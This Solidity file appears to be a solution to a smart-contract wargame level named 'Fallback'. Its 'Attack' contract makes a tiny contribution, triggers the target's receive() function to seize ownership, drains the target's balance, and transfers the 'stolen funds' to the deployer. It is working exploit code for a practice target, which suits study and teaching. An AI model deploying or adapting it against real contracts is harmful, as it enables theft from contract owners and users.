// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Fallback.sol";

contract Attack {
    Fallback target;
    address payable owner;

    constructor(address payable _target) {
        target = Fallback(_target);
        owner = payable(msg.sender);
    }

    // Attack the target contract (requires at least 2 Wei)
    function attack() public payable {
        // Call contribute to deposit 1 Wei
        target.contribute{value: 1 wei}();

        // Trigger the receive() function to become owner
        (bool success, ) = address(target).call{value: 1 wei, gas: 50000}("");
        require(success);

        // Withdraw funds
        target.withdraw();
    }

    // Withdraw stolen funds
    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    // Receive the stolen funds
    receive() external payable {}
}